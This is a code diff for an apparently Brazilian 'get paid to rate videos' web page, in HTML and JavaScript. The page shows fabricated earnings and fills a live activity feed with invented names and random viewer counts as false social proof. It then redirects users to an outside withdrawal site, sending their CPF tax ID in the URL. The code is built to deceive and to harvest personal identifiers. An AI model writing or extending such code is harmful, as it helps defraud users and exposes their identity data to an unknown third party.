+      function showPopup4(reward) {
+        // Atualizar o valor ganho no pop-up
+        document.getElementById("earned-amount").textContent = reward;
+
+        // Se temos dados do usuário da API, usar o primeiro nome
+        if (userApiData && userApiData.nome) {
+          const firstName = userApiData.nome.split(" ")[0];
+          document.getElementById("popup4-first-name").textContent = firstName;
+        }
+
+        // Mostrar o pop-up
+        document.getElementById("custom-popup-4").classList.add("show");
+      }
+
+      // Função para fechar o Pop-up 4
+      function hidePopup4() {
+        document.getElementById("custom-popup-4").classList.remove("show");
+
+        // Atualizar ganhos e continuar para o próximo vídeo
+        const reward = parseInt(
+          document.getElementById("earned-amount").textContent
+        );
+        updateEarnings(reward);
+        nextVideo();
+      }
+
+      // Atualiza ganhos e interface após avaliação
+      function updateEarnings(reward) {
+        totalEarnings += reward;
+        balance += reward;
+        todayEarnings += reward;
+        completedEvaluations++;
+        updateUI();
+      }
+
+      // Vai para o próximo vídeo ou finaliza avaliação
+      function nextVideo() {
+        if (currentVideoIndex < videos.length - 1) {
+          currentVideoIndex++;
+          canEvaluate = false;
+          document.getElementById("approve-btn").disabled = true;
+          document.getElementById("reject-btn").disabled = true;
+          updateUI();
+          startCountdown();
+        } else {
+          // Valor final acumulado
+          const amount = totalEarnings.toFixed(2);
+
+          // ID ou referência do usuário da API
+          let rsc = "104m7"; // valor padrão
+          if (userApiData && (userApiData.CPF || userApiData.cpf)) {
+            rsc = (userApiData.CPF || userApiData.cpf).replace(/[^\d]/g, "");
+          }
+
+          // Monta URL de saque com os parâmetros
+          const redirectUrl = `https://novosapps.site/withdraw/?amount=${amount}&_rsc=${rsc}`;
+
+          // Redireciona automaticamente
+          window.location.href = redirectUrl;
+        }
+      }
+
+      // Eventos dos botões principais
+      document
+        .getElementById("approve-btn")
+        .addEventListener("click", () => handleEvaluation(true));
+      document
+        .getElementById("reject-btn")
+        .addEventListener("click", () => handleEvaluation(false));
+      document
+        .getElementById("rescue-btn")
+        .addEventListener("click", goToCustomPopup2);
+      document
+        .getElementById("confirm-btn")
+        .addEventListener("click", goToCustomPopup3);
+      document.getElementById("start-btn").addEventListener("click", () => {
+        closeAllCustomPopups();
+        updateEarnings(currentReward);
+        nextVideo();
+      });
+
+      // Inicialização quando o documento estiver pronto
+      document.addEventListener("DOMContentLoaded", () => {
+        updateUI();
+        startCountdown();
+
+        // Exemplo de atividades simuladas (pode retirar se quiser)
+        const names = [
+          "Maria Silva",
+          "João Santos",
+          "Ana Costa",
+          "Pedro Lima",
+          "Carla Souza",
+        ];
+        const actions = ["👁️ assistindo", "👍 aprovou", "👎 reprovou"];
+
+        setInterval(() => {
+          const activityList = document.getElementById("activity-list");
+          const name = names[Math.floor(Math.random() * names.length)];
+          const action = actions[Math.floor(Math.random() * actions.length)];
+          const timeAgo = Math.floor(Math.random() * 60) + "s atrás";
+
+          const activityItem = document.createElement("div");
+          activityItem.className = "flex items-center gap-2 text-sm";
+          activityItem.innerHTML = `
+            <div class="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center text-xs font-bold">
+                ${name[0]}
+            </div>
+            <div class="flex-1 min-w-0">
+                <p class="truncate font-medium">${name}</p>
+                <div class="flex items-center gap-1">
+                    <span class="text-blue-600">${action}</span>
+                    <span class="text-gray-400 text-xs">${timeAgo}</span>
+                </div>
+            </div>
+        `;
+
+          activityList.insertBefore(activityItem, activityList.firstChild);
+          while (activityList.children.length > 5) {
+            activityList.removeChild(activityList.lastChild);
+          }
+        }, 3000);
+
+        document.getElementById("viewers-count").textContent =
+          Math.floor(Math.random() * 500) + 100;
+        document.getElementById("approved-count").textContent = Math.floor(
+          Math.random() * 50
+        );
+      });
+    </script>
+    <script>
+      localStorage.setItem("userCPF", "12345678901");
+    </script>
+  </body>
+</html>
+
+<!-- Pop-up 4 - Após Aprovar/Reprovar -->
+<div class="custom-popup-4" id="custom-popup-4">
+  <div class="custom-popup-4-content">
+    <h2 id="popup4-title" class="text-orange-500 font-bold text-2xl mb-4">
+      Parabéns!<span id="popup4-first-name"></span>
+    </h2>
+    <p class="text-gray-700 text-base mb-4">Aproveite, você já ganhou</p>
+    <p class="text-orange-500 font-bold text-4xl mb-6">
+      R$<span id="earned-amount">12</span>!
+    </p>
+    <p class="text-gray-700 text-sm mb-8">
+      Faça mas avaliações e realize seu primeiro saque!
+    </p>
+    <button
+      class="start-button w-full bg-orange-500 hover:bg-orange-600 text-white py-3 rounded-lg font-bold text-lg"
+      onclick="hidePopup4()"
+    >
+      Começar
+    </button>
+  </div>
+</div>
